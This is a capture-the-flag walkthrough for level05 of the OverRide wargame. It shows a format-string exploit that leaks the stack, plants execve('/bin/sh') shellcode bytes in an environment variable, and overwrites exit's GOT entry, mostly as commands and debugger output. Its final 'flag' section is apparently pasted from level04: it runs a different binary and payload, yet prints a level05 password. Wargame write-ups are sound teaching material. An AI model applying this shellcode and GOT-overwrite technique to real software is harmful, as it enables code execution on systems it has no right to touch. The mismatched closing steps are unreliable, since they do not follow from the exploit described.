# level05 walkthrough

## the binary
``` shell
level05@OverRide:~$ ./level05
MARvIN
marvin
```

## methodology
- shellcode + format string attack

The `main` function uses `printf` to output raw array data, which we can leverage to display the variables stored on the stack:
``` shell
level05@OverRide:~$ python /tmp/print_stack.py | ./level05 
aaaa 0x64 0xf7fcfac0 0xf7ec3af9 0xffffd5ef 0xffffd5ee (nil) 0xffffffff 0xffffd674 0xf7fdb000 0x61616161 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
```

Next, we store the shellcode in an environment variable and display its address - the shellcode is credited to J. P. Pereira: [x86 execve("/bin/sh") - 28 bytes](https://shell-storm.org/shellcode/files/shellcode-811.html):
``` shell
level05@OverRide:/tmp$ export SCODE=`python -c 'print("\x90" * 150 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
level05@OverRide:/tmp$ gcc -m32 addr.c -o addr
level05@OverRide:/tmp$ ./addr
SCODE set at 0xffffd788
```

The environment variable will be used to replace the `exit` function, after we identify its address:
``` shell
(gdb) i func exit
All functions matching regular expression "exit":

Non-debugging symbols:
0x08048370  exit
0x08048370  exit@plt
(gdb) x/i 0x08048370
   0x8048370 <exit@plt>:	jmp    *0x80497e0
```

Our payload is generated using an attached script. We need to split the shellcode because of the large numbers involved, as we cannot write a full 32-bit value all at once (shellcode is split into two 16-bit parts and separately injected into the lower and upper 2 bytes of the `exit` function):
``` shell
(gdb) p 0xffff
$1 = 65535
(gdb) p 0xd788
$2 = 55176
(gdb) p 55176-8
$3 = 55168
(gdb) p 65535-55176
$4 = 10359
```

## flag
``` shell
level04@OverRide:~$ python /tmp/payload04.py > /tmp/flag4
level04@OverRide:~$ cat /tmp/flag4 - | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
